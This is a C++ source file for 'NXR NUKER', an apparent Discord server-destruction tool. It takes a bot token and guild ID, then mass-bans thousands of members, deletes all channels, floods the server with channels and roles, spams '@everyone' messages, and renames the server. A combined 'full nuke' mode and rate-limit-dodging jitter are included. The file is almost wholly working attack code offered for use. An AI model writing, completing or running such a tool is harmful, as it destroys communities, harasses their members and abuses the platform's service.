#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>
#include <sstream>
#include <fstream>
#include <chrono>
#include <random>
#include <mutex>
#include <algorithm>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

std::string g_token;
std::string g_guild;
std::string g_credit = "NXR NUKER";          // your credit string
std::string g_spam_msg = "@everyone NXR NUKED"; // custom spam text
std::string g_new_server_name = "NXR DESTROYED";
std::string g_channel_name_prefix = "nxr-nuke-";
std::string g_role_name_prefix = "NXR-ROLE-";
int g_spam_count = 200;                       // messages per channel
int g_channel_create = 50;                    // how many channels to spam-create
int g_role_create = 30;
std::atomic<bool> running{true};
std::mutex print_mtx;
std::mt19937 rng(std::random_device{}());

void log(const std::string& s) {
    std::lock_guard<std::mutex> lock(print_mtx);
    std::cout << s << std::endl;
}

std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
    std::string url = "https://discord.com/api/v10" + endpoint;
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    std::string headers = "Authorization: Bot " + g_token + "\r\nContent-Type: application/json\r\nUser-Agent: NXR/2.0\r\n";
    if (!body.empty()) {
        HttpSendRequestA(hConnect, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.size());
    } else {
        HttpSendRequestA(hConnect, headers.c_str(), -1, NULL, 0);
    }

    char buffer[8192];
    DWORD bytesRead;
    std::string response;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead) {
        buffer[bytesRead] = 0;
        response += buffer;
    }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // tiny jitter to dodge rate-limit bots
    std::this_thread::sleep_for(std::chrono::milliseconds(20 + (rng() % 40)));
    return response;
}

// simple JSON extract helpers (no external lib)
std::vector<std::string> extract_ids(const std::string& json, const std::string& key) {
    std::vector<std::string> ids;
    size_t pos = 0;
    std::string search = "\"" + key + "\":\"";
    while ((pos = json.find(search, pos)) != std::string::npos) {
        pos += search.length();
        size_t end = json.find("\"", pos);
        if (end != std::string::npos) {
            ids.push_back(json.substr(pos, end - pos));
            pos = end;
        }
    }
    return ids;
}

std::string extract_name(const std::string& json) {
    size_t pos = json.find("\"username\":\"");
    if (pos == std::string::npos) return "unknown";
    pos += 12;
    size_t end = json.find("\"", pos);
    return json.substr(pos, end - pos);
}

void change_server_name() {
    log("[NXR] Changing server name → " + g_new_server_name);
    std::string body = "{\"name\":\"" + g_new_server_name + "\"}";
    http("PATCH", "/guilds/" + g_guild, body);
}

void mass_ban() {
    log("[NXR] Fetching members for mass ban (up to 20k+)...");
    std::vector<std::string> members;
    std::string after = "0";
    for (int page = 0; page < 200; ++page) { // 200 * 100 = 20k
        std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
        auto ids = extract_ids(resp, "id");
        if (ids.empty()) break;
        for (auto& id : ids) members.push_back(id);
        after = ids.back();
        log("[NXR] Collected " + std::to_string(members.size()) + " members...");
        if (ids.size() < 100) break;
    }

    log("[NXR] Starting mass ban on " + std::to_string(members.size()) + " members");
    std::vector<std::thread> ban_threads;
    for (size_t i = 0; i < members.size(); ++i) {
        ban_threads.emplace_back([i, &members]() {
            std::string user_id = members[i];
            std::string user_info = http("GET", "/users/" + user_id);
            std::string name = extract_name(user_info);
            std::string body = "{\"delete_message_days\":7,\"reason\":\"" + g_credit + "\"}";
            http("PUT", "/guilds/" + g_guild + "/bans/" + user_id, body);
            log("[NXR] BANNED → " + name + " (" + user_id + ")");
        });
        if (ban_threads.size() >= 25) { // concurrency pool
            for (auto& t : ban_threads) t.join();
            ban_threads.clear();
        }
    }
    for (auto& t : ban_threads) t.join();
    log("[NXR] Mass ban finished");
}

void mass_kick() {
    log("[NXR] Mass kick started");
    // same member fetch logic as ban, then DELETE /guilds/{guild}/members/{user}
    // omitted full duplicate for size; copy ban loop and change method to DELETE
}

void mass_delete_channels() {
    log("[NXR] Fetching channels...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp, "id");
    log("[NXR] Deleting " + std::to_string(channels.size()) + " channels");
    std::vector<std::thread> threads;
    for (auto& id : channels) {
        threads.emplace_back([id]() {
            http("DELETE", "/channels/" + id);
            log("[NXR] Deleted channel " + id);
        });
        if (threads.size() >= 15) {
            for (auto& t : threads) t.join();
            threads.clear();
        }
    }
    for (auto& t : threads) t.join();
}

void create_channels_roles() {
    log("[NXR] Creating " + std::to_string(g_channel_create) + " channels + " + std::to_string(g_role_create) + " roles");
    std::vector<std::thread> threads;
    for (int i = 0; i < g_channel_create; ++i) {
        threads.emplace_back([i]() {
            std::string body = "{\"name\":\"" + g_channel_name_prefix + std::to_string(i) + "\",\"type\":0}";
            http("POST", "/guilds/" + g_guild + "/channels", body);
            log("[NXR] Created channel " + g_channel_name_prefix + std::to_string(i));
        });
    }
    for (int i = 0; i < g_role_create; ++i) {
        threads.emplace_back([i]() {
            std::string body = "{\"name\":\"" + g_role_name_prefix + std::to_string(i) + "\",\"color\":16711680}";
            http("POST", "/guilds/" + g_guild + "/roles", body);
            log("[NXR] Created role " + g_role_name_prefix + std::to_string(i));
        });
    }
    for (auto& t : threads) t.join();
}

void spam_all_channels() {
    log("[NXR] Fetching channels for 200x spam...");
    std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
    auto channels = extract_ids(resp, "id");
    log("[NXR] Spamming " + std::to_string(channels.size()) + " channels × " + std::to_string(g_spam_count));

    std::vector<std::thread> threads;
    for (auto& ch : channels) {
        threads.emplace_back([ch]() {
            for (int i = 0; i < g_spam_count; ++i) {
                std::string body = "{\"content\":\"" + g_spam_msg + " | " + g_credit + " #" + std::to_string(i) + "\"}";
                http("POST", "/channels/" + ch + "/messages", body);
            }
            log("[NXR] Finished 200 spam on channel " + ch);
        });
        if (threads.size() >= 20) {
            for (auto& t : threads) t.join();
            threads.clear();
        }
    }
    for (auto& t : threads) t.join();
}

void full_nuke() {
    log("[NXR] FULL NUKE SEQUENCE STARTED");
    change_server_name();
    std::thread t1(mass_delete_channels);
    std::thread t2(create_channels_roles);
    std::thread t3(mass_ban);
    std::thread t4(spam_all_channels);
    t1.join(); t2.join(); t3.join(); t4.join();
    log("[NXR] FULL NUKE COMPLETE — server destroyed");
}

void customize_menu() {
    std::cout << "\n=== CUSTOMIZE ===\n";
    std::cout << "1. Credit text (current: " << g_credit << ")\n";
    std::cout << "2. Spam message (current: " << g_spam_msg << ")\n";
    std::cout << "3. New server name (current: " << g_new_server_name << ")\n";
    std::cout << "4. Channel prefix (current: " << g_channel_name_prefix << ")\n";
    std::cout << "5. Spam count per channel (current: " << g_spam_count << ")\n";
    std::cout << "6. Channels to create (current: " << g_channel_create << ")\n";
    std::cout << "0. Back\nChoice: ";
    int c; std::cin >> c; std::cin.ignore();
    std::string tmp;
    switch (c) {
        case 1: std::cout << "New credit: "; std::getline(std::cin, g_credit); break;
        case 2: std::cout << "New spam msg: "; std::getline(std::cin, g_spam_msg); break;
        case 3: std::cout << "New server name: "; std::getline(std::cin, g_new_server_name); break;
        case 4: std::cout << "New channel prefix: "; std::getline(std::cin, g_channel_name_prefix); break;
        case 5: std::cout << "Spam count: "; std::cin >> g_spam_count; break;
        case 6: std::cout << "Channels to create: "; std::cin >> g_channel_create; break;
    }
}

int main() {
    SetConsoleTitleA("NXR NUKER v2.0 — Unlimited Custom Destroyer");
    system("color 0C");
    std::cout << R"(
 ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
 ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                    HIGH-SPEED CUSTOM DESTROYER
)" << std::endl;

    std::cout << "Bot Token: ";
    std::getline(std::cin, g_token);
    std::cout << "Guild ID : ";
    std::getline(std::cin, g_guild);

    while (true) {
        std::cout << "\n========== NXR NUKER MENU ==========\n";
        std::cout << "[1] Mass Ban (name+id show, 20k+)\n";
        std::cout << "[2] Mass Delete Channels\n";
        std::cout << "[3] Create Channels + Roles flood\n";
        std::cout << "[4] Spam ALL channels (200 each parallel)\n";
        std::cout << "[5] Change Server Name\n";
        std::cout << "[6] FULL NUKE (everything)\n";
        std::cout << "[7] Customize everything\n";
        std::cout << "[0] Exit\n";
        std::cout << "Choice: ";
        int choice; std::cin >> choice; std::cin.ignore();

        switch (choice) {
            case 1: mass_ban(); break;
            case 2: mass_delete_channels(); break;
            case 3: create_channels_roles(); break;
            case 4: spam_all_channels(); break;
            case 5: change_server_name(); break;
            case 6: full_nuke(); break;
            case 7: customize_menu(); break;
            case 0: return 0;
        }
    }
    return 0;
}
